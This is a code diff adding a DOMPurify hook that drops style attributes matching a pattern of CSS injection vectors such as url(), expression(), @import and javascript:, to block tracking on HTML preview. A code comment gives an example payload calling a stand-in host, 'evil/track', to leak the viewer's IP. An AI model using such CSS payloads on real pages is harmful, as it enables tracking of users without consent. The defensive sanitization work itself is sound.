@@ -14,6 +14,22 @@
 
 import DOMPurify from 'dompurify';
 
+// DOMPurify keeps `style` values that use safe URL schemes, so `style="background:
+// url(https://evil/track)"` would still exfiltrate the viewer's IP on preview.
+// Drop any style value carrying an exfil/execution vector, matching the engine's
+// per-property CSS validation. Registered once (hooks are global) in a DOM context.
+const DANGEROUS_STYLE = /url\(|expression\(|@import|javascript:|\/\*/i;
+let _styleHookAdded = false;
+function ensureStyleHook(): void {
+  if (_styleHookAdded || typeof window === 'undefined') return;
+  _styleHookAdded = true;
+  DOMPurify.addHook('uponSanitizeAttribute', (_node, data) => {
+    if (data.attrName === 'style' && DANGEROUS_STYLE.test(data.attrValue)) {
+      data.keepAttr = false;
+    }
+  });
+}
+
 const ALLOWED_TAGS = [
   'a',
   'b',
@@ -79,6 +95,7 @@ export function safeHtml(html: unknown): string {
     // than ship raw HTML to the response stream.
     return html.replace(/<[^>]*>/g, '');
   }
+  ensureStyleHook();
   return DOMPurify.sanitize(html, {
     ALLOWED_TAGS,
     ALLOWED_ATTR: ALLOWED_ATTRS,
